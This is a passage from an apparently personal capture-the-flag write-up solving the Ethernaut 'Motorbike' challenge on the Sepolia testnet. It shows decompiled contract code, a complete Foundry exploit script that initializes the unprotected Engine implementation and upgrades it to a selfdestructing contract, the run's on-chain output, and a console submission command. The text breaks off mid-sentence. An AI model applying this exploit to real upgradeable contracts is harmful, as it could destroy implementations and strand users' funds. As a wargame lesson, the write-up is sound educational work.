class=\"k\">if</span> <span class=\"p\">(</span><span class=\"o\">!</span><span class=\"n\">v25</span><span class=\"p\">)</span> <span class=\"p\">{</span>                                    <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"o\">!</span><span class=\"n\">MEM</span><span class=\"p\">[</span><span class=\"n\">v29</span><span class=\"p\">],</span> <span class=\"n\">v28</span><span class=\"p\">,</span> <span class=\"n\">MEM</span><span class=\"p\">[</span><span class=\"n\">v29</span><span class=\"p\">]);</span>                                    <span class=\"n\">v32</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"kt\">bytes</span><span class=\"p\">[](</span><span class=\"n\">v33</span><span class=\"p\">.</span><span class=\"n\">length</span><span class=\"p\">);</span>                                    <span class=\"n\">v34</span> <span class=\"o\">=</span> <span class=\"n\">v35</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span>                                    <span class=\"k\">while</span> <span class=\"p\">(</span><span class=\"n\">v34</span> <span class=\"o\">&lt;</span> <span class=\"n\">v33</span><span class=\"p\">.</span><span class=\"n\">length</span><span class=\"p\">)</span> <span class=\"p\">{</span>                                        <span class=\"n\">v32</span><span class=\"p\">[</span><span class=\"n\">v34</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">v33</span><span class=\"p\">[</span><span class=\"n\">v34</span><span class=\"p\">];</span>                                        <span class=\"n\">v34</span> <span class=\"o\">+=</span> <span class=\"mi\">32</span><span class=\"p\">;</span>                                    <span class=\"p\">}</span>                                    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"mi\">30</span><span class=\"p\">)</span> <span class=\"p\">{</span>                                        <span class=\"n\">MEM</span><span class=\"p\">[</span><span class=\"n\">v32</span><span class=\"p\">.</span><span class=\"n\">data</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"kt\">bytes30</span><span class=\"p\">(</span><span class=\"s\">'Address: low-level call failed'</span><span class=\"p\">);</span>                                    <span class=\"p\">}</span>                                    <span class=\"nb\">revert</span><span class=\"p\">(</span><span class=\"n\">Error</span><span class=\"p\">(</span><span class=\"n\">v32</span><span class=\"p\">));</span>                                <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>                                    <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"nb\">keccak256</span><span class=\"p\">(</span><span class=\"n\">MEM</span><span class=\"p\">[</span><span class=\"mi\">32</span> <span class=\"o\">+</span> <span class=\"n\">v784_0x1V0x62cV0x5e4V0x39dV0x8c</span><span class=\"o\">:</span><span class=\"mi\">32</span> <span class=\"o\">+</span> <span class=\"n\">v784_0x1V0x62cV0x5e4V0x39dV0x8c</span> <span class=\"o\">+</span> <span class=\"n\">MEM</span><span class=\"p\">[</span><span class=\"n\">v784_0x1V0x62cV0x5e4V0x39dV0x8c</span><span class=\"p\">]])</span> <span class=\"o\">==</span> <span class=\"nb\">keccak256</span><span class=\"p\">(</span><span class=\"mi\">1000</span><span class=\"p\">),</span> <span class=\"n\">Error</span><span class=\"p\">(</span><span class=\"s\">'Wrong horsePower'</span><span class=\"p\">));</span>                                    <span class=\"k\">return</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">v2</span><span class=\"p\">);</span>                                <span class=\"p\">}</span>                            <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>                                <span class=\"n\">MEM</span><span class=\"p\">[</span><span class=\"n\">MEM</span><span class=\"p\">[</span><span class=\"mi\">64</span><span class=\"p\">]]</span> <span class=\"o\">=</span> <span class=\"mh\">0x8c379a000000000000000000000000000000000000000000000000000000000</span><span class=\"p\">;</span>                                <span class=\"n\">MEM</span><span class=\"p\">[</span><span class=\"n\">MEM</span><span class=\"p\">[</span><span class=\"mi\">64</span><span class=\"p\">]</span> <span class=\"o\">+</span> <span class=\"mi\">4</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"mi\">32</span><span class=\"p\">;</span>                                <span class=\"nb\">revert</span><span class=\"p\">(</span><span class=\"n\">Error</span><span class=\"p\">(</span><span class=\"s\">'Address: call to non-contract'</span><span class=\"p\">));</span>                            <span class=\"p\">}</span>                        <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>                            <span class=\"n\">MEM</span><span class=\"p\">[</span><span class=\"n\">MEM</span><span class=\"p\">[</span><span class=\"mi\">64</span><span class=\"p\">]]</span> <span class=\"o\">=</span> <span class=\"mh\">0x8c379a000000000000000000000000000000000000000000000000000000000</span><span class=\"p\">;</span>                            <span class=\"n\">MEM</span><span class=\"p\">[</span><span class=\"mi\">4</span> <span class=\"o\">+</span> <span class=\"n\">MEM</span><span class=\"p\">[</span><span class=\"mi\">64</span><span class=\"p\">]]</span> <span class=\"o\">=</span> <span class=\"mi\">32</span><span class=\"p\">;</span>                            <span class=\"nb\">revert</span><span class=\"p\">(</span><span class=\"n\">Error</span><span class=\"p\">(</span><span class=\"s\">'Address: insufficient balance for call'</span><span class=\"p\">));</span>                        <span class=\"p\">}</span>                    <span class=\"p\">}</span>                <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>                    <span class=\"n\">MEM</span><span class=\"p\">[</span><span class=\"n\">MEM</span><span class=\"p\">[</span><span class=\"mi\">64</span><span class=\"p\">]]</span> <span class=\"o\">=</span> <span class=\"mh\">0x8c379a000000000000000000000000000000000000000000000000000000000</span><span class=\"p\">;</span>                    <span class=\"n\">MEM</span><span class=\"p\">[</span><span class=\"n\">MEM</span><span class=\"p\">[</span><span class=\"mi\">64</span><span class=\"p\">]</span> <span class=\"o\">+</span> <span class=\"mi\">4</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"mi\">32</span><span class=\"p\">;</span>                    <span class=\"nb\">revert</span><span class=\"p\">(</span><span class=\"n\">Error</span><span class=\"p\">(</span><span class=\"s\">'Address: call to non-contract'</span><span class=\"p\">));</span>                <span class=\"p\">}</span>            <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>                <span class=\"n\">MEM</span><span class=\"p\">[</span><span class=\"n\">MEM</span><span class=\"p\">[</span><span class=\"mi\">64</span><span class=\"p\">]]</span> <span class=\"o\">=</span> <span class=\"mh\">0x8c379a000000000000000000000000000000000000000000000000000000000</span><span class=\"p\">;</span>                <span class=\"n\">MEM</span><span class=\"p\">[</span><span class=\"mi\">4</span> <span class=\"o\">+</span> <span class=\"n\">MEM</span><span class=\"p\">[</span><span class=\"mi\">64</span><span class=\"p\">]]</span> <span class=\"o\">=</span> <span class=\"mi\">32</span><span class=\"p\">;</span>                <span class=\"nb\">revert</span><span class=\"p\">(</span><span class=\"n\">Error</span><span class=\"p\">(</span><span class=\"s\">'Address: insufficient balance for call'</span><span class=\"p\">));</span>            <span class=\"p\">}</span>        <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>            <span class=\"n\">RETURNDATACOPY</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"n\">RETURNDATASIZE</span><span class=\"p\">());</span>            <span class=\"nb\">revert</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"n\">RETURNDATASIZE</span><span class=\"p\">());</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>        <span class=\"n\">RETURNDATACOPY</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"n\">RETURNDATASIZE</span><span class=\"p\">());</span>        <span class=\"nb\">revert</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"n\">RETURNDATASIZE</span><span class=\"p\">());</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">function</span> <span class=\"n\">owner</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"n\">nonPayable</span> <span class=\"p\">{</span>     <span class=\"k\">return</span> <span class=\"n\">_owner</span><span class=\"p\">;</span><span class=\"p\">}</span><span class=\"k\">function</span> <span class=\"mh\">0xd38def5b</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">varg0</span><span class=\"p\">,</span> <span class=\"kt\">address</span> <span class=\"n\">varg1</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"n\">nonPayable</span> <span class=\"p\">{</span>     <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">data</span><span class=\"p\">.</span><span class=\"n\">length</span> <span class=\"o\">-</span> <span class=\"mi\">4</span> <span class=\"o\">&gt;=</span> <span class=\"mi\">64</span><span class=\"p\">);</span>    <span class=\"k\">return</span> <span class=\"kt\">bool</span><span class=\"p\">(</span><span class=\"o\">!</span><span class=\"p\">(</span><span class=\"n\">_createInstance</span><span class=\"p\">[</span><span class=\"n\">varg0</span><span class=\"p\">]).</span><span class=\"n\">code</span><span class=\"p\">.</span><span class=\"n\">size</span><span class=\"p\">);</span><span class=\"p\">}</span><span class=\"c1\">// Note: The function selector is not present in the original solidity code.// However, we display it for the sake of completeness.</span><span class=\"k\">function</span> <span class=\"n\">__function_selector__</span><span class=\"p\">(</span> <span class=\"n\">function_selector</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>     <span class=\"n\">MEM</span><span class=\"p\">[</span><span class=\"mi\">64</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"mi\">128</span><span class=\"p\">;</span>    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">data</span><span class=\"p\">.</span><span class=\"n\">length</span> <span class=\"o\">&lt;</span> <span class=\"mi\">4</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"k\">fallback</span><span class=\"p\">();</span>    <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"mh\">0x8da5cb5b</span> <span class=\"o\">&gt;</span> <span class=\"n\">function_selector</span> <span class=\"o\">&gt;&gt;</span> <span class=\"mi\">224</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"mh\">0x715018a6</span> <span class=\"o\">==</span> <span class=\"n\">function_selector</span> <span class=\"o\">&gt;&gt;</span> <span class=\"mi\">224</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"n\">renounceOwnership</span><span class=\"p\">();</span>        <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>            <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"mh\">0x7726f776</span> <span class=\"o\">==</span> <span class=\"n\">function_selector</span> <span class=\"o\">&gt;&gt;</span> <span class=\"mi\">224</span><span class=\"p\">);</span>            <span class=\"n\">createInstance</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">);</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"mh\">0x8da5cb5b</span> <span class=\"o\">==</span> <span class=\"n\">function_selector</span> <span class=\"o\">&gt;&gt;</span> <span class=\"mi\">224</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"n\">owner</span><span class=\"p\">();</span>    <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"mh\">0xd38def5b</span> <span class=\"o\">==</span> <span class=\"n\">function_selector</span> <span class=\"o\">&gt;&gt;</span> <span class=\"mi\">224</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"mh\">0xd38def5b</span><span class=\"p\">();</span>    <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"mh\">0xf2fde38b</span> <span class=\"o\">==</span> <span class=\"n\">function_selector</span> <span class=\"o\">&gt;&gt;</span> <span class=\"mi\">224</span><span class=\"p\">);</span>        <span class=\"n\">transferOwnership</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">);</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>the Engine Contract is deployed first, and its address is then passed to the Motorbike Contract’s constructor for initialization.</p><p>While there is a standard formula for deriving the address of a deployed contract, Foundry’s <code class=\"language-plaintext highlighter-rouge\">computeCreateAddress()</code> function makes it easy to calculate.</p><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"kt\">uint256</span> <span class=\"n\">nonce</span> <span class=\"o\">=</span> <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">getNonce</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">level</span><span class=\"p\">));</span><span class=\"n\">Motorbike</span> <span class=\"n\">mb_</span> <span class=\"o\">=</span> <span class=\"n\">Motorbike</span><span class=\"p\">(</span><span class=\"k\">payable</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">computeCreateAddress</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">level</span><span class=\"p\">),</span> <span class=\"n\">nonce</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"p\">)));</span><span class=\"n\">Engine</span> <span class=\"n\">eg_</span> <span class=\"o\">=</span> <span class=\"n\">Engine</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">computeCreateAddress</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">level</span><span class=\"p\">),</span> <span class=\"n\">nonce</span><span class=\"p\">));</span></code></pre></div></div><h2 id=\"executing-the-contract\">Executing the Contract</h2><p>Finally, simply execute the Contract.</p><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">Sol</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">).</span><span class=\"n\">solve</span><span class=\"p\">(</span><span class=\"n\">ethernaut</span><span class=\"p\">,</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">level</span><span class=\"p\">),</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">eg_</span><span class=\"p\">));</span><span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Motorbike: \"</span><span class=\"p\">,</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">mb_</span><span class=\"p\">));</span><span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Engine: \"</span><span class=\"p\">,</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">eg_</span><span class=\"p\">));</span><span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"code size: \"</span><span class=\"p\">,</span> <span class=\"n\">_getCodeSize</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">eg_</span><span class=\"p\">)));</span></code></pre></div></div><h2 id=\"complete-exploit-script\">Complete Exploit Script</h2><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/Ethernaut.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">interface</span> <span class=\"n\">Motorbike</span> <span class=\"p\">{</span>    <span class=\"k\">function</span> <span class=\"n\">_getAddressSlot</span><span class=\"p\">(</span><span class=\"kt\">bytes32</span> <span class=\"n\">slot</span><span class=\"p\">)</span> <span class=\"k\">external</span> <span class=\"k\">pure</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">_delegate</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">implementation</span><span class=\"p\">)</span> <span class=\"k\">external</span><span class=\"p\">;</span><span class=\"p\">}</span><span class=\"k\">interface</span> <span class=\"n\">Engine</span> <span class=\"p\">{</span>    <span class=\"k\">function</span> <span class=\"n\">upgrader</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"k\">view</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">initialize</span><span class=\"p\">()</span> <span class=\"k\">external</span><span class=\"p\">;</span>    <span class=\"k\">function</span> <span class=\"n\">upgradeToAndCall</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">newImplementation</span><span class=\"p\">,</span> <span class=\"kt\">bytes</span> <span class=\"k\">memory</span> <span class=\"n\">data</span><span class=\"p\">)</span> <span class=\"k\">external</span><span class=\"p\">;</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">Ex</span> <span class=\"p\">{</span>    <span class=\"k\">function</span> <span class=\"n\">ex</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"nb\">selfdestruct</span><span class=\"p\">(</span><span class=\"k\">payable</span><span class=\"p\">(</span><span class=\"n\">tx</span><span class=\"p\">.</span><span class=\"n\">origin</span><span class=\"p\">));</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">Sol</span> <span class=\"p\">{</span>    <span class=\"k\">function</span> <span class=\"n\">solve</span><span class=\"p\">(</span><span class=\"n\">Ethernaut</span> <span class=\"n\">ethernaut</span><span class=\"p\">,</span> <span class=\"kt\">address</span> <span class=\"n\">level</span><span class=\"p\">,</span> <span class=\"kt\">address</span> <span class=\"n\">_eg</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"n\">ethernaut</span><span class=\"p\">.</span><span class=\"n\">createLevelInstance</span><span class=\"p\">(</span><span class=\"n\">Level</span><span class=\"p\">(</span><span class=\"n\">level</span><span class=\"p\">));</span>        <span class=\"n\">Engine</span><span class=\"p\">(</span><span class=\"n\">_eg</span><span class=\"p\">).</span><span class=\"n\">initialize</span><span class=\"p\">();</span>        <span class=\"n\">Engine</span><span class=\"p\">(</span><span class=\"n\">_eg</span><span class=\"p\">).</span><span class=\"n\">upgradeToAndCall</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"k\">new</span> <span class=\"n\">Ex</span><span class=\"p\">()),</span> <span class=\"n\">abi</span><span class=\"p\">.</span><span class=\"n\">encodeWithSignature</span><span class=\"p\">(</span><span class=\"s\">\"ex()\"</span><span class=\"p\">));</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">MotorbikeSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">Ethernaut</span> <span class=\"n\">ethernaut</span> <span class=\"o\">=</span> <span class=\"n\">Ethernaut</span><span class=\"p\">(</span><span class=\"mh\">0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6</span><span class=\"p\">);</span>    <span class=\"n\">Level</span> <span class=\"n\">level</span> <span class=\"o\">=</span> <span class=\"n\">Level</span><span class=\"p\">(</span><span class=\"mh\">0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">_getCodeSize</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">addr</span><span class=\"p\">)</span> <span class=\"k\">internal</span> <span class=\"k\">view</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">uint256</span> <span class=\"n\">size</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"k\">assembly</span> <span class=\"p\">{</span>            <span class=\"n\">size</span> <span class=\"o\">:=</span> <span class=\"n\">extcodesize</span><span class=\"p\">(</span><span class=\"n\">addr</span><span class=\"p\">)</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">();</span>        <span class=\"n\">Sol</span> <span class=\"n\">sol</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Sol</span><span class=\"p\">();</span>        <span class=\"kt\">uint256</span> <span class=\"n\">pk</span> <span class=\"o\">=</span> <span class=\"kt\">uint256</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">parseBytes32</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">promptSecret</span><span class=\"p\">(</span><span class=\"s\">\"private key\"</span><span class=\"p\">)));</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">signAndAttachDelegation</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">sol</span><span class=\"p\">),</span> <span class=\"n\">pk</span><span class=\"p\">);</span>        <span class=\"kt\">uint256</span> <span class=\"n\">nonce</span> <span class=\"o\">=</span> <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">getNonce</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">level</span><span class=\"p\">));</span>        <span class=\"n\">Motorbike</span> <span class=\"n\">mb_</span> <span class=\"o\">=</span> <span class=\"n\">Motorbike</span><span class=\"p\">(</span><span class=\"k\">payable</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">computeCreateAddress</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">level</span><span class=\"p\">),</span> <span class=\"n\">nonce</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"p\">)));</span>        <span class=\"n\">Engine</span> <span class=\"n\">eg_</span> <span class=\"o\">=</span> <span class=\"n\">Engine</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">computeCreateAddress</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">level</span><span class=\"p\">),</span> <span class=\"n\">nonce</span><span class=\"p\">));</span>        <span class=\"n\">Sol</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">).</span><span class=\"n\">solve</span><span class=\"p\">(</span><span class=\"n\">ethernaut</span><span class=\"p\">,</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">level</span><span class=\"p\">),</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">eg_</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Motorbike: \"</span><span class=\"p\">,</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">mb_</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Engine: \"</span><span class=\"p\">,</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">eg_</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"code size: \"</span><span class=\"p\">,</span> <span class=\"n\">_getCodeSize</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">eg_</span><span class=\"p\">)));</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>The complete exploit code is as follows, and executing it yields the following values.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/MotorbikeSol.sol:MotorbikeSol <span class=\"nt\">--account</span> mingw <span class=\"nt\">--sender</span> 0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514 <span class=\"nt\">--rpc-url</span> sepolia <span class=\"nt\">--skip-simulation</span> <span class=\"nt\">--isolate</span> <span class=\"nt\">--broadcast</span><span class=\"o\">[</span>⠊] Compiling...No files changed, compilation skippedprivate key: <span class=\"o\">[</span>hidden]Script ran successfully.<span class=\"o\">==</span> Logs <span class=\"o\">==</span>  Motorbike:  0xb6Ee323Edf5e4091239234cA66E73ec0eAc7F3Ff  Engine:  0x8824F3ce858C01E200bF0AA8381d18393C154eAB  code size:  0SKIPPING ON CHAIN SIMULATION.Enter keystore password:<span class=\"c\">##### sepolia</span>✅  <span class=\"o\">[</span>Success] Hash: 0xe664e9415d354643dffb4796de37f7c6df4db23667dfcfbebc18c4d63e2a6b9bContract Address: 0xeD2427fef1Cbb2889662DCE61250c0D4aB5CB52eBlock: 10065934Paid: 0.0006675423286207 ETH <span class=\"o\">(</span>330850 gas <span class=\"k\">*</span> 2.017658542 gwei<span class=\"o\">)</span><span class=\"c\">##### sepolia</span>✅  <span class=\"o\">[</span>Success] Hash: 0x2c3881cd7e96240ed1b563a9124ab3477beec32430e27c11b925afdad6329f28Block: 10065935Paid: 0.0014929189030595 ETH <span class=\"o\">(</span>754460 gas <span class=\"k\">*</span> 1.978791325 gwei<span class=\"o\">)</span>✅ Sequence <span class=\"c\">#1 on sepolia | Total Paid: 0.0021604612316802 ETH (1085310 gas * avg 1.998224933 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p>I can confirm the addresses of the Motorbike and Engine Contracts, and verify that the Engine contract’s code size is 0.</p><h2 id=\"ethernaut-submission\">Ethernaut Submission</h2><p>Now, we need to verify the solution on the Ethernaut site.</p><p>If we verify by simply clicking the “Submit Instance” button, a different contract—not the one executed in Foundry—will be submitted.</p><p>Therefore, we must manually submit using the Motorbike Contract address obtained from the Foundry output.</p><p>Go to the Motorbike challenge page, press F12, and execute the following command in the console tab.</p><div class=\"language-js highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">await</span> <span class=\"nx\">ethereum</span><span class=\"p\">.</span><span class=\"nx\">request</span><span class=\"p\">({</span>  <span class=\"na\">method</span><span class=\"p\">:</span> <span class=\"dl\">'</span><span class=\"s1\">eth_sendTransaction</span><span class=\"dl\">'</span><span class=\"p\">,</span>  <span class=\"na\">params</span><span class=\"p\">:</span> <span class=\"p\">[{</span>    <span class=\"na\">from</span><span class=\"p\">:</span> <span class=\"nx\">player</span><span class=\"p\">,</span>    <span class=\"na\">to</span><span class=\"p\">:</span> <span class=\"dl\">'</span><span class=\"s1\">0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6</span><span class=\"dl\">'</span><span class=\"p\">,</span>    <span class=\"na\">data</span><span class=\"p\">:</span> <span class=\"nx\">web3</span><span class=\"p\">.</span><span class=\"nx\">eth</span><span class=\"p\">.</span><span class=\"nx\">abi</span><span class=\"p\">.</span><span class=\"nx\">encodeFunctionCall</span><span class=\"p\">(</span>      <span class=\"p\">{</span>        <span class=\"na\">name</span><span class=\"p\">:</span> <span class=\"dl\">'</span><span class=\"s1\">submitLevelInstance</span><span class=\"dl\">'</span><span class=\"p\">,</span>        <span class=\"na\">type</span><span class=\"p\">:</span> <span class=\"dl\">'</span><span class=\"s1\">function</span><span class=\"dl\">'</span><span class=\"p\">,</span>        <span class=\"na\">inputs</span><span class=\"p\">:</span> <span class=\"p\">[{</span><span class=\"na\">type</span><span class=\"p\">:</span> <span class=\"dl\">'</span><span class=\"s1\">address</span><span class=\"dl\">'</span><span class=\"p\">,</span> <span class=\"na\">name</span><span class=\"p\">:</span> <span class=\"dl\">'</span><span class=\"s1\">_instance</span><span class=\"dl\">'</span><span class=\"p\">}]</span>      <span class=\"p\">},</span>      <span class=\"p\">[</span><span class=\"dl\">'</span><span class=\"s1\">0xb6Ee323Edf5e4091239234cA66E73ec0eAc7F3Ff</span><span class=\"dl\">'</span><span class=\"p\">]</span>    <span class=\"p\">),</span>    <span class=\"na\">gas</span><span class=\"p\">:</span> <span class=\"dl\">'</span><span class=\"s1\">0x200000</span><span class=\"dl\">'</span>  <span class=\"p\">}]</span><span class=\"p\">})</span></code></pre></div></div><p>This code directly executes the <code class=\"language-plaintext highlighter-rouge\">submitLevelInstance()</code> function using the MetaMask API. Upon execution, the submission is completed via MetaMask interaction, and if you refresh the page</p><p><img src=\"https://0o3q.github.io/images/2026-01-17-Motorbike/solve.png\" alt=\"Image solve\" /></p><p>We can confirm that the challenge has been solved.</p><h2 id=\"revoking-the-delegation\">Revoking the Delegation</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>cast code 0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514 <span class=\"nt\">--rpc-url</span> sepolia0xef0100ed2427fef1cbb2889662dce61250c0d4ab5cb52e</code></pre></div></div><p>Inspecting the wallet address reveals that the code delegation is still active.</p><p>This must be revoked, as it could be triggered when 